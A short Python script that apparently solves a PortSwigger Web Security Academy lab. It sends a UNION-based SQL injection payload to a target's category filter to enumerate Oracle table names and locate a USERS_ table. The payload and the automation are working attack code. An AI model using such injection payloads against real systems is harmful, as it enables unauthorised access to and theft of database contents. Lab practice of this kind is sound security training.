import requests
import argparse
import bs4

# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Specify a target. \nE.g. -t https://abcdefghijk1234567.web-security-academy.net")
args = parser.parse_args()

if not args.target:
    print("[!] You need to specify a target.")
    print("[*] Example usage: sqli-08.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)

# test the connection to the target
r = requests.get(args.target)
if r.status_code == 200:
    print('[*] Target is up')
else:
    print('[!] Target seems down')
    exit(0)

# /filter?category=Accessories' UNION SELECT table_name,NULL from all_tables--
# USERS_

payload = args.target + "/filter?category=Accessories' UNION SELECT table_name,NULL from all_tables--"
print('[*] Payload created: ' + payload)

s = requests.Session()
r = s.get(payload)

if r.status_code == 200:
    print('[*] Payload sent')
    soup = bs4.BeautifulSoup(r.content, 'html.parser')
    rows = soup.select('tbody tr')
    table_prefix = "<th>USERS_"
    for row in rows:
        th = row.find_all('th')
        th_string = str(th[0])
        if table_prefix in th_string:
            td_split_1 = th_string.split('>')
            td_split_2 = td_split_1[1].split('<')
            table_name = td_split_2[0]
            print("[*] Table name found: " + table_name)

